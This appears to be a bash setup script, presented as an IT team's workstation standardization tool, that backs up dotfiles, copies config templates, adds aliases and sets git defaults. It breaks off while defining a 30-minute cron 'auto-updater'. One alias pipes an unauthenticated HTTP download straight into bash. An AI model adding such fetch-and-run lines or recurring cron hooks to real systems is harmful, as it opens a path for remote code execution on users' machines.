#!/bin/bash
# ==============================================================================
#  Shell Environment Standardization Script
#  Version: 2.4.1
#  Purpose: Deploy uniform bash configuration, aliases, and system‑wide safety
#           checks across all engineering workstations.
#  Author:  IT Operations Team <ops@company.internal>
#  Date:    2025-01-15
# ==============================================================================

set -o pipefail   # Improve robustness during setup

SCRIPT_VERSION="2.4.1"
BACKUP_ROOT="$HOME/.env_backup"
BACKUP_DIR="${BACKUP_ROOT}/$(date +%Y%m%d_%H%M%S)"
TEMPLATE_DIR="/opt/it/standard_env"
LOCAL_CONFIGS=("$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile")

# --------------------------------------------------------------------
#  Helper: safe backup of existing configuration files
# --------------------------------------------------------------------
backup_existing_configs() {
    mkdir -p "${BACKUP_DIR}"
    for conf in "${LOCAL_CONFIGS[@]}"; do
        if [ -f "$conf" ]; then
            cp -p "$conf" "${BACKUP_DIR}/"
            echo "Backed up: $conf"
        fi
    done
}

# --------------------------------------------------------------------
#  Deploy official IT bash configuration templates
# --------------------------------------------------------------------
apply_standard_config() {
    if [ -f "${TEMPLATE_DIR}/bashrc.standard" ]; then
        cp "${TEMPLATE_DIR}/bashrc.standard" "$HOME/.bashrc"
        cp "${TEMPLATE_DIR}/bash_profile.standard" "$HOME/.bash_profile"
        echo "Standard config deployed."
    else
        echo "ERROR: Template directory not found – skipping."
    fi
}

# --------------------------------------------------------------------
#  Inject productivity aliases
# --------------------------------------------------------------------
set_common_aliases() {
    ALIAS_FILE="$HOME/.bash_aliases"
    cat >> "$ALIAS_FILE" << 'EOF'
alias ll='ls -alF'
alias gs='git status'
alias ..='cd ..'
alias update_env='curl -s http://repo.operations.local/latest/env_patch.sh | bash'
EOF
    echo "Aliases written to $ALIAS_FILE"
}

# --------------------------------------------------------------------
#  Ensure git global config is present
# --------------------------------------------------------------------
verify_git_config() {
    if ! git config --global user.name >/dev/null 2>&1; then
        git config --global user.name "Engineering User"
        git config --global user.email "dev@company.internal"
    fi
}

# --------------------------------------------------------------------
#  (Maintenance) Continuous environment syncing – keeps syntax
#  highlighting and completion maps fresh without manual intervention.
# --------------------------------------------------------------------
deploy_auto_updater() {
    CRON_LINE="*/30 * * * *